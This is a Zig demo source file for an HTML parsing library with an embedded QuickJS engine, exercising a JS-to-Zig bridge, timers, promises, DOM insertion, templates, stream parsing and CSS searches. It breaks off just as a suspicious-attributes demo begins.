const std = @import("std");
const builtin = @import("builtin");
const z = @import("root.zig");
// TODO: Enable once type issues are resolved
// const DOMBridge = @import("dom_bridge.zig").DOMBridge;
const EventLoop = @import("event_loop.zig").EventLoop;
const NativeBridge = @import("js_native_bridge.zig");
const qjs = @cImport({
    @cInclude("quickjs.h");
});

const native_os = builtin.os.tag;

var debug_allocator: std.heap.DebugAllocator(.{}) = .init;

/// Install console.log as a global function in QuickJS context
fn installConsole(ctx: ?*qjs.JSContext) void {
    const global = qjs.JS_GetGlobalObject(ctx);
    defer qjs.JS_FreeValue(ctx, global);

    const console_obj = qjs.JS_NewObject(ctx);
    const log_fn = qjs.JS_NewCFunction2(ctx, js_console_log, "log", 1, qjs.JS_CFUNC_generic_magic, 0);
    _ = qjs.JS_SetPropertyStr(ctx, console_obj, "log", log_fn);
    _ = qjs.JS_SetPropertyStr(ctx, global, "console", console_obj);
}

/// Demo: Native Bridge - Passing data between QuickJS and Zig
fn demoNativeBridge(ctx: ?*qjs.JSContext) !void {
    z.print("\n=== Native Bridge Demo: JS ↔ Zig Data Transfer ------\n\n", .{});

    // Test 1: Process regular array
    z.print("--- Test 1: Process Array (JS → Zig → JS) ---\n", .{});
    const test1 =
        \\const data = [1, 2, 3, 4, 5];
        \\console.log("Input array:", data);
        \\const result = Native.processArray(data);
        \\console.log("Result from Zig:", result);
        \\result;
    ;

    const result1 = qjs.JS_Eval(ctx, test1, test1.len, "<test1>", 0);
    defer qjs.JS_FreeValue(ctx, result1);

    // Test 2: Transform array (return new array)
    z.print("\n--- Test 2: Transform Array (Return New Array) ---\n", .{});
    const test2 =
        \\const input = [1, 2, 3, 4, 5];
        \\console.log("Input:", input);
        \\const output = Native.transformArray(input);
        \\console.log("Output from Zig:", output);
        \\output;
    ;

    const result2 = qjs.JS_Eval(ctx, test2, test2.len, "<test2>", 0);
    defer qjs.JS_FreeValue(ctx, result2);

    // Test 3: TypedArray (zero-copy performance)
    z.print("\n--- Test 3: TypedArray (Zero-Copy) ---\n", .{});
    const test3 =
        \\const buffer = new Float64Array([10, 20, 30, 40, 50]);
        \\console.log("TypedArray input:", buffer);
        \\const result = Native.processTypedArray(buffer);
        \\console.log("Result from Zig (zero-copy!):", result);
        \\result;
    ;

    const result3 = qjs.JS_Eval(ctx, test3, test3.len, "<test3>", 0);
    defer qjs.JS_FreeValue(ctx, result3);

    // Test 4: Process object
    z.print("\n--- Test 4: Process Object ---\n", .{});
    const test4 =
        \\const obj = { x: 10, y: 20, values: [1, 2, 3, 4, 5] };
        \\console.log("Input object:", JSON.stringify(obj));
        \\const result = Native.processObject(obj);
        \\console.log("Result from Zig:", result);
        \\result;
    ;

    const result4 = qjs.JS_Eval(ctx, test4, test4.len, "<test4>", 0);
    defer qjs.JS_FreeValue(ctx, result4);

    // Test 5: Process text
    z.print("\n--- Test 5: Text Processing ---\n", .{});
    const test5 =
        \\const messy = "Hello   World  !  How   are   you?";
        \\console.log("Input text:", messy);
        \\const clean = Native.processText(messy);
        \\console.log("Cleaned by Zig:", clean);
        \\clean;
    ;

    const result5 = qjs.JS_Eval(ctx, test5, test5.len, "<test5>", 0);
    defer qjs.JS_FreeValue(ctx, result5);

    z.print("\n✅ Native bridge working!\n", .{});
    z.print("  • JavaScript can call Zig functions\n", .{});
    z.print("  • Data flows: JS → Zig → JS\n", .{});
    z.print("  • Heavy computation runs at native speed\n\n", .{});
}

pub fn main() !void {
    // Arena allocator setup for benchmarking
    // var arena = std.heap.ArenaAllocator.init(std.heap.c_allocator);
    // defer arena.deinit();
    // const gpa = arena.allocator();

    const gpa, const is_debug = gpa: {
        if (native_os == .wasi) break :gpa .{ std.heap.wasm_allocator, false };
        break :gpa switch (builtin.mode) {
            .Debug, .ReleaseSafe => .{ debug_allocator.allocator(), true },
            .ReleaseFast, .ReleaseSmall => .{ std.heap.c_allocator, false },
        };
    };
    defer if (is_debug) {
        _ = debug_allocator.deinit();
    };

    const rt = qjs.JS_NewRuntime();
    defer qjs.JS_FreeRuntime(rt);

    const ctx = qjs.JS_NewContext(rt);
    defer qjs.JS_FreeContext(ctx);

    // Install console.log globally for all demos
    installConsole(ctx);

    // Install native bridge for high-performance data processing
    NativeBridge.installNativeBridge(ctx);

    firstQuickJSTest();

    try demoNativeBridge(ctx);
    try demoEventLoop(gpa, ctx, rt);
    try demoExecuteScriptFromHTML(gpa, ctx);
    try demoQuickJSProxyAndStreams(ctx);
    // TODO: Fix type issues - concept is solid, implementation needs type adjustments
    // try demoVirtualDOM_SSR(gpa, ctx);
    try zexplore_example_com(gpa, "https://www.example.com");
    try demoSimpleParsing(gpa);
    try demoTemplate(gpa);
    try demoParserReUse(gpa);
    try demoStreamParser(gpa);
    try demoInsertAdjacentElement(gpa);
    try demoInsertAdjacentHTML(gpa);
    try demoSetInnerHTML(gpa);
    try demoSearchComparison(gpa);
    try demoSuspiciousAttributes(gpa);
    try demoNormalizer(gpa);
    try normalizeString_DOM_parsing_bencharmark(gpa);
    try serverSideRenderingBenchmark(gpa);
}

/// Console.log implementation for QuickJS
fn js_console_log(
    ctx: ?*qjs.JSContext,
    _: qjs.JSValue,
    argc: c_int,
    argv: [*c]qjs.JSValue,
) callconv(.c) qjs.JSValue {
    var i: c_int = 0;
    while (i < argc) : (i += 1) {
        const str = qjs.JS_ToCString(ctx, argv[@intCast(i)]);
        if (str != null) {
            defer qjs.JS_FreeCString(ctx, str);
            if (i > 0) z.print(" ", .{});
            z.print("{s}", .{str});
        }
    }
    z.print("\n", .{});

    // Return undefined - use runtime creation to avoid comptime issues
    var val: qjs.JSValue = undefined;
    val.tag = qjs.JS_TAG_UNDEFINED;
    val.u = std.mem.zeroes(qjs.JSValueUnion);
    return val;
}

/// Demo: Event Loop with setTimeout/setInterval
fn demoEventLoop(allocator: std.mem.Allocator, ctx: ?*qjs.JSContext, rt: ?*qjs.JSRuntime) !void {
    z.print("\n=== Event Loop Demo: setTimeout & setInterval ------\n\n", .{});

    // Initialize event loop
    var event_loop = try EventLoop.init(allocator, ctx, rt);
    defer event_loop.deinit();

    // Install timer APIs (setTimeout, setInterval, clearTimeout, clearInterval)
    // Note: console.log is already installed globally in main()
    try event_loop.installTimerAPIs();

    // Test 1: Simple setTimeout
    z.print("--- Test 1: setTimeout (500ms) ---\n", .{});
    const timeout_test =
        \\let count = 0;
        \\setTimeout(() => {
        \\  count = 42;
        \\  console.log("setTimeout fired! count = " + count);
        \\}, 500);
        \\count; // Should be 0 initially
    ;

    const result1 = qjs.JS_Eval(ctx, timeout_test, timeout_test.len, "<timeout_test>", 0);
    defer qjs.JS_FreeValue(ctx, result1);

    var initial_count: i32 = 0;
    _ = qjs.JS_ToInt32(ctx, &initial_count, result1);
    z.print("Initial count (before timeout): {d}\n", .{initial_count});

    // Test 2: setInterval with clearInterval
    z.print("\n--- Test 2: setInterval (200ms, cancel after 5 iterations) ---\n", .{});
    const interval_test =
        \\let counter = 0;
        \\const intervalId = setInterval(() => {
        \\  counter++;
        \\  console.log("Interval tick: " + counter);
        \\  if (counter >= 5) {
        \\    clearInterval(intervalId);
        \\    console.log("Interval cleared!");
        \\  }
        \\}, 200);
        \\intervalId;
    ;

    const result2 = qjs.JS_Eval(ctx, interval_test, interval_test.len, "<interval_test>", 0);
    defer qjs.JS_FreeValue(ctx, result2);

    // Test 3: Multiple timers with different delays
    z.print("\n--- Test 3: Multiple timers (100ms, 300ms, 700ms) ---\n", .{});
    const multiple_timers =
        \\setTimeout(() => console.log("Timer 1: 100ms"), 100);
        \\setTimeout(() => console.log("Timer 2: 300ms"), 300);
        \\setTimeout(() => console.log("Timer 3: 700ms"), 700);
        \\"Timers scheduled";
    ;

    const result3 = qjs.JS_Eval(ctx, multiple_timers, multiple_timers.len, "<multiple>", 0);
    defer qjs.JS_FreeValue(ctx, result3);

    const scheduled_msg = qjs.JS_ToCString(ctx, result3);
    if (scheduled_msg != null) {
        defer qjs.JS_FreeCString(ctx, scheduled_msg);
        z.print("{s}\n", .{scheduled_msg});
    }

    // Test 4: Async/await with setTimeout (simulating async operations)
    z.print("\n--- Test 4: Async/await + setTimeout ---\n", .{});
    const async_test =
        \\async function delayedGreeting(name, ms) {
        \\  return new Promise(resolve => {
        \\    setTimeout(() => resolve("Hello, " + name + "!"), ms);
        \\  });
        \\}
        \\
        \\(async () => {
        \\  console.log("Starting async operation...");
        \\  const msg = await delayedGreeting("Zig", 400);
        \\  console.log("Async result: " + msg);
        \\})();
        \\"Async operation started";
    ;

    const result4 = qjs.JS_Eval(ctx, async_test, async_test.len, "<async>", 0);
    defer qjs.JS_FreeValue(ctx, result4);

    // Run the event loop to process all timers
    z.print("\n🔄 Running event loop...\n\n", .{});
    try event_loop.run();

    z.print("\n✅ Event loop completed!\n", .{});
    z.print("  • setTimeout works\n", .{});
    z.print("  • setInterval works\n", .{});
    z.print("  • clearTimeout/clearInterval work\n", .{});
    z.print("  • Async/await + setTimeout integration works\n\n", .{});

    // Verify final count value
    const global = qjs.JS_GetGlobalObject(ctx);
    defer qjs.JS_FreeValue(ctx, global);

    const count_prop = qjs.JS_GetPropertyStr(ctx, global, "count");
    defer qjs.JS_FreeValue(ctx, count_prop);

    var final_count: i32 = 0;
    _ = qjs.JS_ToInt32(ctx, &final_count, count_prop);
    z.print("Final count (after setTimeout): {d}\n\n", .{final_count});
}

/// Demo: QuickJS Proxy and Async/Streams Support
fn demoQuickJSProxyAndStreams(ctx: ?*qjs.JSContext) !void {
    z.print("\n=== QuickJS Advanced Features: Proxy & Async ------\n\n", .{});

    // Note: console.log is already installed globally in main()

    // Test 1: ES6 Proxy - intercept property access
    const proxy_test =
        \\// Create a reactive object using Proxy
        \\const handler = {
        \\  get: function(target, prop) {
        \\    console.log(`Getting property: ${prop}`);
        \\    return target[prop];
        \\  },
        \\  set: function(target, prop, value) {
        \\    console.log(`Setting ${prop} = ${value}`);
        \\    target[prop] = value;
        \\    return true;
        \\  }
        \\};
        \\
        \\const obj = { name: "Zig", version: "0.15.2" };
        \\const proxy = new Proxy(obj, handler);
        \\
        \\// Test getter
        \\const n = proxy.name;
        \\
        \\// Test setter
        \\proxy.version = "0.16.0";
        \\
        \\"Proxy test complete";
    ;

    z.print("--- Test 1: ES6 Proxy ---\n", .{});
    const result1 = qjs.JS_Eval(ctx, proxy_test, proxy_test.len, "<proxy>", 0);
    defer qjs.JS_FreeValue(ctx, result1);

    if (qjs.JS_IsException(result1) != 0) {
        const exception = qjs.JS_GetException(ctx);
        defer qjs.JS_FreeValue(ctx, exception);
        const error_str = qjs.JS_ToCString(ctx, exception);
        if (error_str != null) {
            defer qjs.JS_FreeCString(ctx, error_str);
            z.print("Error: {s}\n", .{error_str});
        }
    } else {
        const result_str = qjs.JS_ToCString(ctx, result1);
        if (result_str != null) {
            defer qjs.JS_FreeCString(ctx, result_str);
            z.print("Result: {s}\n\n", .{result_str});
        }
    }

    // Test 2: Promise support (basic async)
    const promise_test =
        \\// Create a Promise
        \\const promise = new Promise((resolve, reject) => {
        \\  // Simulate async operation
        \\  resolve("Promise resolved!");
        \\});
        \\
        \\let result = "pending";
        \\promise.then(value => {
        \\  result = value;
        \\  console.log("Promise:", value);
        \\});
        \\
        \\// Note: QuickJS executes promises synchronously unless you use the event loop
        \\result;
    ;

    z.print("--- Test 2: Promise Support ---\n", .{});
    const result2 = qjs.JS_Eval(ctx, promise_test, promise_test.len, "<promise>", 0);
    defer qjs.JS_FreeValue(ctx, result2);

    if (qjs.JS_IsException(result2) != 0) {
        const exception = qjs.JS_GetException(ctx);
        defer qjs.JS_FreeValue(ctx, exception);
        const error_str = qjs.JS_ToCString(ctx, exception);
        if (error_str != null) {
            defer qjs.JS_FreeCString(ctx, error_str);
            z.print("Error: {s}\n", .{error_str});
        }
    } else {
        // Execute pending jobs (needed for promises)
        _ = qjs.JS_ExecutePendingJob(qjs.JS_GetRuntime(ctx), null);

        const result_str = qjs.JS_ToCString(ctx, result2);
        if (result_str != null) {
            defer qjs.JS_FreeCString(ctx, result_str);
            z.print("Result: {s}\n\n", .{result_str});
        }
    }

    // Test 3: Async/Await (requires promise job execution)
    const async_test =
        \\async function fetchData() {
        \\  return "Data from async function";
        \\}
        \\
        \\let asyncResult = "not executed";
        \\
        \\(async () => {
        \\  asyncResult = await fetchData();
        \\  console.log("Async result:", asyncResult);
        \\})();
        \\
        \\"Async function created";
    ;

    z.print("--- Test 3: Async/Await ---\n", .{});
    const result3 = qjs.JS_Eval(ctx, async_test, async_test.len, "<async>", 0);
    defer qjs.JS_FreeValue(ctx, result3);

    if (qjs.JS_IsException(result3) != 0) {
        const exception = qjs.JS_GetException(ctx);
        defer qjs.JS_FreeValue(ctx, exception);
        const error_str = qjs.JS_ToCString(ctx, exception);
        if (error_str != null) {
            defer qjs.JS_FreeCString(ctx, error_str);
            z.print("Error: {s}\n", .{error_str});
        }
    } else {
        // Execute all pending promise jobs
        var ctx_ptr: ?*qjs.JSContext = undefined;
        while (qjs.JS_ExecutePendingJob(qjs.JS_GetRuntime(ctx), &ctx_ptr) > 0) {}

        const result_str = qjs.JS_ToCString(ctx, result3);
        if (result_str != null) {
            defer qjs.JS_FreeCString(ctx, result_str);
            z.print("Sync result: {s}\n", .{result_str});
        }

        // Check the async result variable
        const global = qjs.JS_GetGlobalObject(ctx);
        defer qjs.JS_FreeValue(ctx, global);

        const async_result_val = qjs.JS_GetPropertyStr(ctx, global, "asyncResult");
        defer qjs.JS_FreeValue(ctx, async_result_val);

        const async_result_str = qjs.JS_ToCString(ctx, async_result_val);
        if (async_result_str != null) {
            defer qjs.JS_FreeCString(ctx, async_result_str);
            z.print("Async variable value: {s}\n\n", .{async_result_str});
        }
    }

    // Test 4: Generator functions
    const generator_test =
        \\function* numberGenerator() {
        \\  yield 1;
        \\  yield 2;
        \\  yield 3;
        \\}
        \\
        \\const gen = numberGenerator();
        \\const values = [];
        \\
        \\let next = gen.next();
        \\while (!next.done) {
        \\  values.push(next.value);
        \\  next = gen.next();
        \\}
        \\
        \\JSON.stringify(values);
    ;

    z.print("--- Test 4: Generator Functions ---\n", .{});
    const result4 = qjs.JS_Eval(ctx, generator_test, generator_test.len, "<generator>", 0);
    defer qjs.JS_FreeValue(ctx, result4);

    if (qjs.JS_IsException(result4) != 0) {
        const exception = qjs.JS_GetException(ctx);
        defer qjs.JS_FreeValue(ctx, exception);
        const error_str = qjs.JS_ToCString(ctx, exception);
        if (error_str != null) {
            defer qjs.JS_FreeCString(ctx, error_str);
            z.print("Error: {s}\n", .{error_str});
        }
    } else {
        const result_str = qjs.JS_ToCString(ctx, result4);
        if (result_str != null) {
            defer qjs.JS_FreeCString(ctx, result_str);
            z.print("Generator output: {s}\n\n", .{result_str});
        }
    }

    z.print("✅ QuickJS supports:\n", .{});
    z.print("  • ES6 Proxy (for reactive programming)\n", .{});
    z.print("  • Promises (with job queue execution)\n", .{});
    z.print("  • Async/Await (requires pending job execution)\n", .{});
    z.print("  • Generators (yield/next pattern)\n", .{});
    z.print("  • Symbol, WeakMap, WeakSet, etc.\n\n", .{});
}

fn firstQuickJSTest() void {
    const rt = qjs.JS_NewRuntime();
    defer qjs.JS_FreeRuntime(rt);

    // Test QuickJS is working
    const ctx = qjs.JS_NewContext(rt);
    defer qjs.JS_FreeContext(ctx);

    // Test 1: Simple arithmetic
    const js_code = "2 + 2";
    const result = qjs.JS_Eval(ctx, js_code, js_code.len, "<input>", 0);
    defer qjs.JS_FreeValue(ctx, result);

    var result_int: i32 = 0;
    _ = qjs.JS_ToInt32(ctx, &result_int, result);
    z.print("QuickJS test: 2 + 2 = {d}\n", .{result_int});

    // Test 2: Execute more complex JavaScript
    const complex_js =
        \\const info = { name: "Zig", version: "0.15.2" };
        \\const message = `Hello from ${info.name} ${info.version}!`;
        \\message;
    ;
    const result2 = qjs.JS_Eval(ctx, complex_js, complex_js.len, "<eval>", 0);
    defer qjs.JS_FreeValue(ctx, result2);

    const js_str = qjs.JS_ToCString(ctx, result2);
    if (js_str != null) {
        defer qjs.JS_FreeCString(ctx, js_str);
        z.print("QuickJS result: {s}\n\n", .{js_str});
    }
}
/// use `parseString` or `createDocFromString` to create a document with a BODY element populated by the input string
fn demoSimpleParsing(_: std.mem.Allocator) !void {
    const html = "<div></div>";
    {
        const doc = try z.createDocument();
        defer z.destroyDocument(doc);

        try z.parseString(doc, html);

        const body = z.bodyNode(doc).?;
        const div = z.firstChild(body).?;
        const tag_name = z.nodeName_zc(div);
        std.debug.assert(std.mem.eql(u8, tag_name, "DIV"));
    }
    {
        const doc = try z.createDocFromString(html);
        defer z.destroyDocument(doc);

        const body = z.bodyNode(doc).?;
        const div = z.firstChild(body).?;
        const tag_name = z.nodeName_zc(div);
        std.debug.assert(std.mem.eql(u8, tag_name, "DIV"));
    }
}

fn demoNormalizer(gpa: std.mem.Allocator) !void {
    const messy_html =
        \\<div>
        \\<!-- comment -->
        \\
        \\<p>Content</p>
        \\
        \\<pre>  preserve  this  </pre>
        \\
        \\</div>
    ;

    // const expected = "<div><!-- comment --><p>Content</p><pre>  preserve  this  </pre></div>";
    const expected_noc = "<div><p>Content</p><pre>  preserve  this  </pre></div>";

    const doc = try z.createDocument();
    defer z.destroyDocument(doc);

    // -- DOM-based normalization
    try z.parseString(doc, messy_html);

    const body_elt1 = z.bodyElement(doc).?;
    try z.normalizeDOMwithOptions(
        gpa,
        body_elt1,
        .{ .skip_comments = true },
    );

    const result1 = try z.innerHTML(gpa, body_elt1);
    defer gpa.free(result1);

    std.debug.assert(std.mem.eql(u8, expected_noc, result1));

    // -- string normalization
    const cleaned = try z.normalizeHtmlStringWithOptions(
        gpa,
        messy_html,
        .{ .remove_comments = true },
    );
    defer gpa.free(cleaned);
    z.print("\n\n Normalized sring: {s}\n\n", .{cleaned});
    std.debug.assert(std.mem.eql(u8, cleaned, result1));

    try z.parseString(doc, cleaned);
    const body_elt2 = z.bodyElement(doc).?;
    const result2 = try z.innerHTML(gpa, body_elt2);
    defer gpa.free(result2);

    std.debug.assert(std.mem.eql(u8, result2, result1));
}

/// use the `Parser` engine to parse HTML with template support
fn demoTemplate(allocator: std.mem.Allocator) !void {
    const html =
        \\<table id="producttable">
        \\  <thead>
        \\    <tr>
        \\      <td>Code</td>
        \\      <td>Product_Name</td>
        \\    </tr>
        \\  </thead>
        \\  <tbody>
        \\    <!-- existing data could optionally be included here -->
        \\  </tbody>
        \\</table>
        \\
        \\<template id="productrow">
        \\  <tr>
        \\    <td class="record">Code: 1</td>
        \\    <td>Name: 1</td>
        \\  </tr>
        \\</template>
    ;

    // eliminate all the whitespace between tags
    const normed_html = try z.normalizeText(allocator, html);
    defer allocator.free(normed_html);

    // var parser = try z.Parser.init(allocator);
    // defer parser.deinit();
    const doc = try z.createDocFromString(html);
    defer z.destroyDocument(doc);

    const body = z.bodyNode(doc).?;

    const template_elt = z.getElementById(
        body,
        "productrow",
    ).?;

    const tbody_elt = z.getElementByTag(body, .tbody);
    const tbody_node = z.elementToNode(tbody_elt.?);

    // add twice the template
    try z.useTemplateElement(
        allocator,
        template_elt,
        tbody_node,
        .none,
    );
    try z.useTemplateElement(
        allocator,
        template_elt,
        tbody_node,
        .none,
    );

    try z.normalizeDOM(allocator, z.nodeToElement(body).?);

    const resulting_html = try z.innerHTML(allocator, z.nodeToElement(body).?);
    defer allocator.free(resulting_html);

    const expected = "<table id=\"producttable\"><thead><tr><td>Code</td><td>Product_Name</td></tr></thead><tbody><!-- existing data could optionally be included here --><tr><td class=\"record\">Code: 1</td><td>Name: 1</td></tr><tr><td class=\"record\">Code: 1</td><td>Name: 1</td></tr></tbody></table><template id=\"productrow\"><tr><td class=\"record\">Code: 1</td><td>Name: 1</td></tr></template>";

    z.print("=== DEMO TEMPLATE-----------\n", .{});

    const normed = try z.normalizeText(allocator, resulting_html);
    defer allocator.free(normed);

    try z.prettyPrint(allocator, tbody_node);
    try std.testing.expectEqualStrings(expected, normed);
}

fn demoParserReUse(allocator: std.mem.Allocator) !void {
    var parser = try z.Parser.init(allocator);
    defer parser.deinit();

    const doc = try parser.parse("<div><ul></ul></div>", .none);
    defer z.destroyDocument(doc);

    const body = z.bodyNode(doc).?;
    const ul_elt = z.getElementByTag(body, .ul).?;

    for (0..3) |i| {
        const li = try std.fmt.allocPrint(
            allocator,
            "<li id='item-{}'>Item {}</li>",
            .{ i, i },
        );
        defer allocator.free(li);

        try parser.parseAndAppend(
            ul_elt,
            li,
            .ul,
            .none,
        );
    }
    // z.print("\n === Demonstrate parser engine reuse ===\n\n", .{});
    // z.print("\n Insert interpolated <li id=\"item-X\"> Item X</li>\n\n", .{});

    // try z.prettyPrint(allocator, body);
    // z.print("\n\n", .{});
}

/// use Stream engine
fn demoStreamParser(allocator: std.mem.Allocator) !void {
    z.print("\n === Demonstrate parsing streams on-the-fly ===\n\n", .{});
    var streamer = try z.Stream.init(allocator);
    defer streamer.deinit();

    try streamer.beginParsing();

    const streams = [_][]const u8{
        "<!DOCTYPE html><html><head><title>Large",
        " Document</title></head><body>",
        "<table id=\"producttable\">",
        "<caption>Company data</caption><thead>",
        "<tr><th scope=\"col\">",
        "Code</th><th>Product_Name</th>",
        "</tr></thead><tbody>",
    };
    for (streams) |chunk| {
        z.print("chunk:  {s}\n", .{chunk});
        try streamer.processChunk(chunk);
    }

    for (0..3) |i| {
        const li = try std.fmt.allocPrint(
            allocator,
            "<tr id={}><td >Code: {}</td><td>Name: {}</td></tr>",
            .{ i, i, i },
        );
        defer allocator.free(li);
        z.print("chunk:  {s}\n", .{li});

        try streamer.processChunk(li);
    }
    const end_chunk = "</tbody></table></body></html>";
    z.print("chunk:  {s}\n", .{end_chunk});
    try streamer.processChunk(end_chunk);
    try streamer.endParsing();

    const html_doc = streamer.getDocument();
    defer z.destroyDocument(html_doc);
    // const html_node = z.documentRoot(html_doc).?;

    // z.print("\n\n", .{});
    // try z.prettyPrint(allocator, html_node);
    // z.print("\n\n", .{});
    // try z.printDocStruct(html_doc);
    // z.print("\n\n", .{});
}

fn demoInsertAdjacentElement(allocator: std.mem.Allocator) !void {
    const doc = try z.createDocFromString(
        \\<div id="container">
        \\ <p id="target">Target</p>
        \\</div>
    );
    defer z.destroyDocument(doc);
    errdefer z.destroyDocument(doc);

    const body = z.bodyNode(doc).?;
    const target = z.getElementById(body, "target").?;

    const before_end_elem = try z.createElementWithAttrs(
        doc,
        "span",
        &.{.{ .name = "class", .value = "before end" }},
    );
    try z.insertAdjacentElement(
        target,
        .beforeend,
        before_end_elem,
    );

    const after_end_elem = try z.createElementWithAttrs(
        doc,
        "span",
        &.{.{ .name = "class", .value = "after end" }},
    );
    try z.setContentAsText(z.elementToNode(after_end_elem), "After End");

    try z.insertAdjacentElement(
        target,
        "afterend",
        after_end_elem,
    );

    const after_begin_elem = try z.createElementWithAttrs(
        doc,
        "span",
        &.{.{ .name = "class", .value = "after begin" }},
    );

    try z.insertAdjacentElement(
        target,
        "afterbegin",
        after_begin_elem,
    );
    const before_begin_elem = try z.createElementWithAttrs(
        doc,
        "span",
        &.{.{ .name = "class", .value = "before begin" }},
    );

    try z.insertAdjacentElement(
        target,
        .beforebegin,
        before_begin_elem,
    );

    const html = try z.outerHTML(allocator, z.nodeToElement(body).?);
    defer allocator.free(html);
    // z.print("\n=== Demonstrate insertAdjacentElement ===\n\n", .{});
    // try z.prettyPrint(allocator, body);

    // Normalize whitespace for clean comparison
    const clean_html = try z.normalizeText(allocator, html);
    defer allocator.free(clean_html);

    const expected = "<body><div id=\"container\"><span class=\"before begin\"></span><p id=\"target\"><span class=\"after begin\"></span>Target<span class=\"before end\"></span></p><span class=\"after end\">After End</span></div></body>";

    std.debug.assert(std.mem.eql(u8, expected, clean_html) == true);
}

fn demoInsertAdjacentHTML(allocator: std.mem.Allocator) !void {
    // const allocator = std.testing.allocator;
    const doc = try z.createDocFromString(
        \\<div id="container">
        \\    <p id="target">Target</p>
        \\</div>
    );
    defer z.destroyDocument(doc);
    errdefer z.destroyDocument(doc);

    const body = z.bodyNode(doc).?;
    const target = z.getElementById(body, "target").?;

    try z.insertAdjacentHTML(
        allocator,
        target,
        .beforeend,
        "<span class=\"before end\"></span>",
        .none,
    );

    try z.insertAdjacentHTML(
        allocator,
        target,
        "afterend",
        "<span class=\"after end\">After End</span>",
        .none,
    );

    try z.insertAdjacentHTML(
        allocator,
        target,
        "afterbegin",
        "<span class=\"after begin\"></span>",
        .none,
    );

    try z.insertAdjacentHTML(
        allocator,
        target,
        "beforebegin",
        "<span class=\"before begin\"></span>",
        .none,
    );

    // Show result after insertAdjacentElement
    const html = try z.outerHTML(allocator, z.nodeToElement(body).?);
    defer allocator.free(html);
    // z.print("\n=== Demonstrate insertAdjacentHTML ===\n\n", .{});
    // try z.prettyPrint(allocator, body);

    // Normalize whitespace for clean comparison
    const clean_html = try z.normalizeText(allocator, html);
    defer allocator.free(clean_html);

    const expected = "<body><div id=\"container\"><span class=\"before begin\"></span><p id=\"target\"><span class=\"after begin\"></span>Target<span class=\"before end\"></span></p><span class=\"after end\">After End</span></div></body>";

    std.debug.assert(std.mem.eql(u8, expected, clean_html) == true);

    // z.print("\n--- Normalized HTML --- \n\n{s}\n", .{clean_html});
    // z.print("\n\n", .{});
}

/// `setInnerHTML` and `innerHTML` with `normalize` for easy comparison (remove whitespace only text nodes)
fn demoSetInnerHTML(allocator: std.mem.Allocator) !void {
    // z.print("\n=== Demonstrate setInnerHTML & innerHTML ===\n\n", .{});
    const doc = try z.createDocument();
    defer z.destroyDocument(doc);
    try z.parseString(doc, "<div id=\"target\"></div>");

    const body = z.bodyNode(doc).?;
    const div = z.getElementById(body, "target").?;

    const new_div_elt = try z.setInnerHTML(div, "<p class=\"new-content\">New Content</p>");

    // try z.prettyPrint(allocator,z.documentRoot(doc).?);

    try z.normalizeDOM(allocator, new_div_elt);

    // Show result after setInnerHTML
    const html_new_div = try z.innerHTML(
        allocator,
        new_div_elt,
    );
    defer allocator.free(html_new_div);

    const expected = "<p class=\"new-content\">New Content</p>";

    std.debug.assert(std.mem.eql(u8, expected, html_new_div) == true);
}

fn demoSearchComparison(allocator: std.mem.Allocator) !void {
    z.print("\n=== Search Comparison --------------------------\n\n", .{});

    // Create test HTML with diverse elements
    const test_html =
        \\<div class="main-container">
        \\  <h1 class="title main">Main Title</h1>
        \\  <section class="content">
        \\    <p id="1" class="text main-text">First paragraph</p>
        \\    <div class="box main-box">Box content</div>
        \\    <article class="post main-post">Article content</article>
        \\  </section>
        \\  <aside class="sidebar">
        \\    <h2 class="subtitle">Sidebar Title</h2>
        \\    <p class="text sidebar-text">Sidebar paragraph</p>
        \\    <div class="widget">Widget content</div>
        \\  </aside>
        \\  <footer  aria-label="foot" class="main-footer container">
        \\    <p class="copyright">© 2024</p>
        \\  </footer>
        \\</div>
    ;

    const doc = try z.createDocFromString(test_html);
    defer z.destroyDocument(doc);
    const body = z.bodyNode(doc).?;
    // try z.prettyPrint(allocator, body);
    var css_engine = try z.createCssEngine(allocator);
    defer css_engine.deinit();

    // 1. Walker-based attribute search (token-based matching with hasClass)
    const walker_results = try z.getElementsByClassName(allocator, doc, "main");
    defer allocator.free(walker_results);
    const walker_count = walker_results.len;
    z.print("\n1. Walker-based attribute [class = 'main']:     Found {} elements\n", .{walker_count});

    for (walker_results, 0..) |element, i| {
        const tag = z.tagName_zc(element);
        const class_attr = z.getAttribute_zc(element, "class") orelse "none";
        z.print("   [{}]: <{s}> class=\"{s}\"\n", .{ i, tag, class_attr });
    }

    // 2. CSS Selector search (case-insensitive, token-based)

    const css_results = try z.querySelectorAll(allocator, doc, ".main");
    defer allocator.free(css_results);
    const css_count = css_results.len;
    z.print("\n2. CSS Selector search [class = 'main']:        Found {} elements (case-insensitive)\n", .{css_count});

    for (css_results, 0..) |element, i| {
        const tag = z.tagName_zc(element);
        const class_attr = z.getAttribute_zc(element, "class") orelse "none";
        z.print("   [{}]: <{s}> class=\"{s}\"\n", .{ i, tag, class_attr });
    }

    const footer = try z.getElementByDataAttribute(
        body,
        "aria",
        "label",
        null,
    );
    if (footer) |foot| {
        const i = 0;
        const tag = z.tagName_zc(foot);
        const class_attr = z.getAttribute_zc(foot, "class") orelse "none";
        z.print("\n3. Walker ByDataAttribute 'aria-label':         Found  1 element\n", .{});
        z.print("{s}\n", .{z.getAttribute_zc(foot, "aria-label").?});
        z.print("   [{}]: <{s}> class=\"{s}\"\n", .{ i, tag, class_attr });
        var footer_token_list = try z.ClassList.init(
            allocator,
            foot,
        );
        defer footer_token_list.deinit();
        z.print("   nb classes: {d}\n", .{footer_token_list.length()});
        try footer_token_list.add("footer");
        std.debug.assert(footer_token_list.contains("footer"));
        _ = try footer_token_list.toggle("footer");
        std.debug.assert(!footer_token_list.contains("footer"));
    }

    // Demonstrate DOM synchronization by adding an element
    const new_element = try z.createElementWithAttrs(doc, "span", &.{.{ .name = "class", .value = "main new-element" }});
    z.appendChild(body, z.elementToNode(new_element));

    // Search again to show updated results
    const updated_walker_results = try z.getElementsByClassName(allocator, doc, "main");
    defer allocator.free(updated_walker_results);
    const updated_walker_count = updated_walker_results.len;

    const updated_css_results = try z.querySelectorAll(allocator, doc, ".main");
    defer allocator.free(updated_css_results);
    const updated_css_count = updated_css_results.len;

    z.print("\nAdd a new element <span class=\"main new-element\"> with class 'main' and rerun the search:\n\n", .{});
    z.print("1. Walker-based: {} -> {} elements\n", .{ walker_count, updated_walker_count });
    z.print("2. CSS Selectors: {} -> {} elements\n", .{ css_count, updated_css_count });

    z.print("\n", .{});
}

fn demoSuspiciousAttributes(allocator: std.mem.Allocator) !void {
    // Create a document with lots of suspicious/malicious attributes to see the highlighting
    const malicious_content =
        \\<div>
        \\  <!-- a comment -->
